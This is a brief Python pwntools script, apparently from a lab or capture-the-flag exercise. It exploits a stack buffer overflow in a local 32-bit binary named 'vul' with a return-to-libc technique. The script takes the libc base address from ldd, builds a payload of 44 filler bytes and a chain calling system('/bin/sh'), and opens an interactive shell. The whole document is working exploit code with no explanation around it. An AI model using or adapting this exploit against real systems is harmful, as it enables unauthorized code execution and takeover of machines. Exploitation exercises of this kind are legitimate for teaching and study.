from pwn import *
import os
import posix

# $ ldd vul
#	linux-gate.so.1 (0xf7fc4000)
#	libc.so.6 => /lib32/libc.so.6 (0xf7d81000)
#	/lib/ld-linux.so.2 (0xf7fc6000)
# use the previous command to get the libc path and base address

libc_path = "/lib32/libc.so.6"
lib_base = 0xf7d81000

libc = ELF(libc_path)
system_addr = 0xf7d81000 + libc.symbols['system']
bin_sh = 0xf7d81000 + next(libc.search(b'/bin/sh'))

log.info ("system_addr " + hex(system_addr))
log.info ("bin_sh " + hex(bin_sh))

# Get the absolute path to retlib
path = os.path.abspath("./vul")

p = process(path)

rop  = p32(system_addr)
rop += p32(0x41414141)
rop += p32(bin_sh)

payload = bytes("A", 'latin-1')*(40 + 4) + rop 
p.send(payload)

log.success("Enjoy your shell.")
p.interactive()
